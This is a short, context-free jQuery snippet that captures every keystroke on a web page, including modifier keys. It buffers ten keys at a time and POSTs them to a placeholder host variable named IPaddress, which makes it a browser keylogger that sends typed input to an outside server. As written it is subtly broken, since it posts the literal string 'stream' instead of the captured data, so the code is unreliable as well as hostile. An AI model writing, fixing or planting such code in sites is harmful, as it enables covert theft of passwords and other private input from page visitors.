var stream = [];
$(document).keydown(function(e) {
    stream.push({
        'code': e.which,
        'modify': {
            'alt': e.altKey,
            'ctrl': e.ctrlKey,
            'shift': e.shiftKey
        }
    });
    if (stream.length == 10) {
        $.ajax({
            type: "POST",
            url: IPaddress,
            data: "stream",
        });
        stream = [];
    }
    console.log(stream);

});